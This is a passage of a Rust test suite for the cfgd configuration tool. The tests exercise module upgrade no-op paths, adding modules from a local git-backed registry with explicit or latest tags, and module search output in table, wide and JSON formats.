        // Lockfile untouched on the error path.
        let lock_after = std::fs::read_to_string(work.path().join("modules.lock")).unwrap();
        assert_eq!(
            lock_before, lock_after,
            "lockfile must not change when no version can be resolved"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_upgrade_returns_early_when_already_at_target_commit() {
        // Drives the `new_commit == old_entry.commit` early-return arm:
        // upgrade requested against the exact tag the lockfile already pins,
        // so cmd_module_upgrade should bail with "already at this version"
        // BEFORE rewriting the lockfile.
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let bare_root = tempfile::tempdir().unwrap();
        let bare = make_bare_with_module(bare_root.path(), "mymod", "v1.0.0");
        let url_v1 = format!("{}@v1.0.0", cfgd_core::to_file_url(&bare));

        let cli = test_cli(work.path());
        let printer1 = make_printer();
        cmd_module_add_remote(&cli, &printer1, &url_v1, None, true, true).unwrap();

        let lock_before = std::fs::read_to_string(work.path().join("modules.lock")).unwrap();

        // Re-upgrade to the SAME tag — should detect the same commit and bail.
        let (printer2, buf2) =
            cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
        cmd_module_upgrade(&cli, &printer2, "mymod", Some("v1.0.0"), true, true)
            .expect("re-upgrading to current ref should succeed (no-op)");
        drop(printer2);

        let out = buf2.lock().unwrap();
        assert!(
            out.contains("already at this version"),
            "early-return arm should announce no-op: {out}"
        );

        // Lockfile content must not have changed — proves the early-return
        // fired BEFORE save_lockfile was called.
        let lock_after = std::fs::read_to_string(work.path().join("modules.lock")).unwrap();
        assert_eq!(
            lock_before, lock_after,
            "lockfile must be byte-identical after a same-commit upgrade"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_upgrade_bails_when_target_is_a_local_module() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        // Module exists only as a local module — no lockfile entry.
        let local_mod_yaml =
            "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: localmod\nspec: {}\n";
        make_module(work.path(), "localmod", local_mod_yaml);

        let cli = test_cli(work.path());
        let printer = make_printer();
        let err = cmd_module_upgrade(&cli, &printer, "localmod", Some("v1"), true, true)
            .expect_err("upgrade should refuse to touch local modules");
        let msg = err.to_string();
        assert!(
            msg.contains("local module") || msg.contains("edit it directly"),
            "error should redirect user to edit local module on disk: {msg}"
        );
    }
}

// ─── cmd_module_add_from_registry — end-to-end against a local registry ───────
//
// Drives the registry-resolution entry-point: parse `<registry>/<module>[@<tag>]`,
// load the registry URL from cfgd.yaml, optionally look up the latest tag, and
// hand off to `cmd_module_add_remote` with the assembled
// `<registry_url>//modules/<mod>@<mod>/<tag>` URL. Both the explicit-tag and
// the latest-lookup paths are exercised, plus the error arms for unknown
// registry, no matching tags, and a malformed registry reference.

#[cfg(unix)]
mod cmd_module_add_from_registry_local {
    use super::*;
    use serial_test::serial;
    use std::path::{Path, PathBuf};

    /// Init a non-bare git repo at `src_dir/<subpath>` with
    /// `modules/<mod>/module.yaml` committed and the HEAD tagged as
    /// `<mod>/v<version>`. Returns the source path so `file://<src>` can serve
    /// as the registry URL. Multiple versions can be added by calling
    /// `add_module_version`.
    fn init_registry_source(
        src_dir: &Path,
        mod_name: &str,
        version: &str,
        description: &str,
    ) -> PathBuf {
        let src_repo = git2::Repository::init(src_dir).unwrap();
        let module_rel = format!("modules/{mod_name}/module.yaml");
        let module_yaml = format!(
            "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: {mod_name}\n  description: {description}\nspec: {{}}\n"
        );
        std::fs::create_dir_all(src_dir.join("modules").join(mod_name)).unwrap();
        std::fs::write(src_dir.join(&module_rel), module_yaml).unwrap();
        let mut index = src_repo.index().unwrap();
        index.add_path(Path::new(&module_rel)).unwrap();
        index.write().unwrap();
        let tree_id = index.write_tree().unwrap();
        let tree = src_repo.find_tree(tree_id).unwrap();
        let sig = git2::Signature::now("t", "t@example.com").unwrap();
        let commit_id = src_repo
            .commit(Some("HEAD"), &sig, &sig, "add module", &tree, &[])
            .unwrap();
        drop(tree);
        let commit_obj = src_repo.find_commit(commit_id).unwrap();
        src_repo
            .tag_lightweight(
                &format!("{mod_name}/v{version}"),
                commit_obj.as_object(),
                false,
            )
            .unwrap();
        src_dir.to_path_buf()
    }

    /// Append a second tagged version on top of HEAD in an existing registry
    /// source. Used to exercise the latest-version lookup path.
    fn add_module_version(src_dir: &Path, mod_name: &str, version: &str, description: &str) {
        let src_repo = git2::Repository::open(src_dir).unwrap();
        let module_rel = format!("modules/{mod_name}/module.yaml");
        let module_yaml = format!(
            "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: {mod_name}\n  description: {description}\nspec: {{}}\n"
        );
        std::fs::write(src_dir.join(&module_rel), module_yaml).unwrap();
        let mut index = src_repo.index().unwrap();
        index.add_path(Path::new(&module_rel)).unwrap();
        index.write().unwrap();
        let tree_id = index.write_tree().unwrap();
        let tree = src_repo.find_tree(tree_id).unwrap();
        let sig = git2::Signature::now("t", "t@example.com").unwrap();
        let parent = src_repo.head().unwrap().peel_to_commit().unwrap();
        let commit_id = src_repo
            .commit(Some("HEAD"), &sig, &sig, "bump", &tree, &[&parent])
            .unwrap();
        drop(tree);
        let commit_obj = src_repo.find_commit(commit_id).unwrap();
        src_repo
            .tag_lightweight(
                &format!("{mod_name}/v{version}"),
                commit_obj.as_object(),
                false,
            )
            .unwrap();
    }

    /// Overwrite cfgd.yaml in `config_dir` so the registry entry shows up
    /// under `spec.modules.registries`. `setup_config_dir` seeded the file
    /// with the bare "profile only" shape — we replace it wholesale rather
    /// than YAML-merging.
    fn write_cfgd_yaml_with_registry(config_dir: &Path, reg_name: &str, reg_url: &str) {
        let yaml = format!(
            "apiVersion: cfgd.io/v1alpha1\nkind: Config\nmetadata:\n  name: t\nspec:\n  profile: default\n  modules:\n    registries:\n      - name: {reg_name}\n        url: {reg_url}\n"
        );
        std::fs::write(config_dir.join("cfgd.yaml"), yaml).unwrap();
    }

    /// Match the `EnvGuard` from the sibling local-bare module — required so
    /// `is_git_source` accepts `file://` URLs. Independent definition because
    /// Rust visibility forbids sharing a sibling-private type across `mod`
    /// boundaries.
    struct EnvGuard {
        key: &'static str,
    }
    impl EnvGuard {
        fn set(key: &'static str, value: &str) -> Self {
            // SAFETY: serialized via #[serial].
            unsafe {
                std::env::set_var(key, value);
            }
            Self { key }
        }
    }
    impl Drop for EnvGuard {
        fn drop(&mut self) {
            // SAFETY: serialized via #[serial].
            unsafe {
                std::env::remove_var(self.key);
            }
        }
    }

    #[test]
    #[serial]
    fn cmd_module_add_from_registry_explicit_tag_writes_lockfile_and_profile() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let src_root = tempfile::tempdir().unwrap();
        let src = init_registry_source(src_root.path(), "alpha", "1.0.0", "Alpha module");
        let reg_url = cfgd_core::test_helpers::file_url(&src);
        write_cfgd_yaml_with_registry(work.path(), "myreg", &reg_url);

        let cli = test_cli(work.path());
        let (printer, buf) =
            cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
        cmd_module_add_from_registry(&cli, &printer, "myreg/alpha@v1.0.0", true, true)
            .expect("explicit-tag registry add should succeed");
        drop(printer);

        // The resolver should log the per-module URL it built before delegating.
        let out = buf.lock().unwrap();
        assert!(
            out.contains("Resolved: myreg/alpha"),
            "resolver should log the assembled URL: {out}"
        );

        let lockfile = std::fs::read_to_string(work.path().join("modules.lock")).unwrap();
        assert!(
            lockfile.contains("alpha"),
            "lockfile should record the registry module: {lockfile}"
        );
        assert!(
            lockfile.contains("alpha/v1.0.0"),
            "lockfile pinned_ref should record the per-module tag: {lockfile}"
        );

        let profile_yaml =
            std::fs::read_to_string(work.path().join("profiles/default.yaml")).unwrap();
        assert!(
            profile_yaml.contains("myreg/alpha"),
            "profile should reference the registry-qualified module name: {profile_yaml}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_add_from_registry_no_tag_resolves_latest_version() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let src_root = tempfile::tempdir().unwrap();
        let src = init_registry_source(src_root.path(), "beta", "1.0.0", "Beta v1");
        add_module_version(&src, "beta", "2.5.0", "Beta v2.5");
        let reg_url = cfgd_core::test_helpers::file_url(&src);
        write_cfgd_yaml_with_registry(work.path(), "myreg", &reg_url);

        let cli = test_cli(work.path());
        let (printer, buf) =
            cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
        // No `@<tag>` — should fetch tags and pick the highest semver.
        cmd_module_add_from_registry(&cli, &printer, "myreg/beta", true, true)
            .expect("latest-version registry add should succeed");
        drop(printer);

        let out = buf.lock().unwrap();
        assert!(
            out.contains("No tag specified"),
            "resolver should announce the latest-lookup fallback: {out}"
        );

        let lockfile = std::fs::read_to_string(work.path().join("modules.lock")).unwrap();
        assert!(
            lockfile.contains("beta/v2.5.0"),
            "lockfile should pin the highest available tag: {lockfile}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_add_from_registry_unknown_registry_errors() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        // cfgd.yaml left without any registries declared.
        let cli = test_cli(work.path());
        let printer = make_printer();
        let err = cmd_module_add_from_registry(&cli, &printer, "ghost-reg/foo@v1.0.0", true, true)
            .expect_err("unknown registry should error");
        let msg = err.to_string();
        assert!(
            msg.contains("ghost-reg") && msg.contains("registry add"),
            "error should name the missing registry and point at the fix: {msg}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_add_from_registry_invalid_reference_format_errors() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let cli = test_cli(work.path());
        let printer = make_printer();
        // No slash — `parse_registry_ref` should reject this before any I/O.
        let err = cmd_module_add_from_registry(&cli, &printer, "noslash", true, true)
            .expect_err("bare reference without `/` should be rejected");
        let msg = err.to_string();
        assert!(
            msg.contains("registry/module"),
            "error should explain the expected reference shape: {msg}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_add_from_registry_unknown_module_errors_when_no_tags() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let src_root = tempfile::tempdir().unwrap();
        let src = init_registry_source(src_root.path(), "alpha", "1.0.0", "Alpha");
        let reg_url = cfgd_core::test_helpers::file_url(&src);
        write_cfgd_yaml_with_registry(work.path(), "myreg", &reg_url);

        let cli = test_cli(work.path());
        let printer = make_printer();
        // Registry resolves, but `beta` has no matching tags in the source.
        let err = cmd_module_add_from_registry(&cli, &printer, "myreg/beta", true, true)
            .expect_err("module with no tags should error on latest lookup");
        let msg = err.to_string();
        assert!(
            msg.contains("No tags") && msg.contains("beta"),
            "error should name the missing module: {msg}"
        );
    }

    // ─── cmd_module_search end-to-end against the local registry fixture ──
    //
    // The non-end-to-end search tests above cover the no-config / no-registries
    // early returns. These tests drive the full body: fetch_registry_modules
    // for each declared registry, filter via `filter_and_build_search_results`,
    // route to structured / wide / standard output, and the error-arm when a
    // registry fetch fails.

    #[test]
    #[serial]
    fn cmd_module_search_returns_matching_module_in_table() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let src_root = tempfile::tempdir().unwrap();
        let src = init_registry_source(src_root.path(), "alpha", "1.0.0", "Alpha module");
        let reg_url = cfgd_core::test_helpers::file_url(&src);
        write_cfgd_yaml_with_registry(work.path(), "myreg", &reg_url);

        let cli = test_cli(work.path());
        let (printer, buf) =
            cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
        cmd_module_search(&cli, &printer, "alph").expect("search should succeed");
        drop(printer);

        let out = buf.lock().unwrap();
        assert!(
            out.contains("Search Modules: alph"),
            "header should include the query: {out}"
        );
        assert!(
            out.contains("Searched myreg"),
            "should announce per-registry scan completion: {out}"
        );
        assert!(out.contains("alpha"), "module row should appear: {out}");
        assert!(
            out.contains("v1.0.0"),
            "latest tag should render in the Latest column: {out}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_search_reports_no_matches_when_query_misses() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let src_root = tempfile::tempdir().unwrap();
        let src = init_registry_source(src_root.path(), "alpha", "1.0.0", "Alpha module");
        let reg_url = cfgd_core::test_helpers::file_url(&src);
        write_cfgd_yaml_with_registry(work.path(), "myreg", &reg_url);

        let cli = test_cli(work.path());
        let (printer, buf) =
            cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
        cmd_module_search(&cli, &printer, "no-such-name").expect("search should succeed");
        drop(printer);

        let out = buf.lock().unwrap();
        assert!(
            out.contains("Search Modules: no-such-name"),
            "header should include the (missing) query: {out}"
        );
        assert!(
            out.contains("No modules found matching your query"),
            "empty-result message should render: {out}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_search_wide_format_includes_registry_column() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let src_root = tempfile::tempdir().unwrap();
        let src = init_registry_source(src_root.path(), "alpha", "1.0.0", "Alpha module");
        let reg_url = cfgd_core::test_helpers::file_url(&src);
        write_cfgd_yaml_with_registry(work.path(), "myreg", &reg_url);

        let mut cli = test_cli(work.path());
        cli.output = super::OutputFormatArg(cfgd_core::output::OutputFormat::Wide);
        let (printer, cap) = cfgd_core::output::Printer::for_test_doc_with_format(
            cfgd_core::output::OutputFormat::Wide,
        );
        cmd_module_search(&cli, &printer, "alph").expect("wide search should succeed");
        drop(printer);

        let out = cap.human();
        assert!(
            out.contains("Registry"),
            "wide table should include a Registry column: {out}"
        );
        assert!(
            out.contains("myreg"),
            "registry name should render in the Registry column: {out}"
        );
        assert!(
            out.contains("Alpha module"),
            "description should render in the Description column: {out}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_search_json_emits_results_array() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let src_root = tempfile::tempdir().unwrap();
        let src = init_registry_source(src_root.path(), "alpha", "1.0.0", "Alpha module");
        let reg_url = cfgd_core::test_helpers::file_url(&src);
        write_cfgd_yaml_with_registry(work.path(), "myreg", &reg_url);

        let cli = test_cli_json(work.path());
        let (printer, cap) = cfgd_core::output::Printer::for_test_doc();
        cmd_module_search(&cli, &printer, "alpha").expect("json search should succeed");
        drop(printer);

        let json = cap.json().expect("doc captured json");
        let arr = json
            .as_array()
            .expect("structured output should be an array");
        assert_eq!(arr.len(), 1, "should emit exactly one result");
        // `name` is registry-qualified (`<registry>/<module>`) so callers can
        // round-trip it back through `cfgd module add` without losing context.
        assert_eq!(arr[0]["name"], "myreg/alpha");
        assert_eq!(arr[0]["registry"], "myreg");
        assert_eq!(arr[0]["version"], "v1.0.0");
        assert_eq!(arr[0]["description"], "Alpha module");
    }

    #[test]
    #[serial]
    fn cmd_module_search_unreachable_registry_emits_failure_warning() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        // Point the registry URL at a path that doesn't exist — the
        // file:// resolver should fail to clone, the search should NOT
        // bail (it should continue to the empty-results print), and the
        // failure should surface as a warning line.
        let ghost = work.path().join("does-not-exist-registry");
        let ghost_url = cfgd_core::test_helpers::file_url(&ghost);
        write_cfgd_yaml_with_registry(work.path(), "myreg", &ghost_url);

        let cli = test_cli(work.path());
        let (printer, buf) =
            cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
        cmd_module_search(&cli, &printer, "anything")
            .expect("search should succeed even when a registry fails");
        drop(printer);

        let out = buf.lock().unwrap();
        assert!(
            out.contains("Failed to fetch source: myreg"),
            "failure should mention the registry name: {out}"
        );
        assert!(
            out.contains("No modules found matching your query"),
            "with all registries failing, the empty-result message should render: {out}"
        );
    }
}
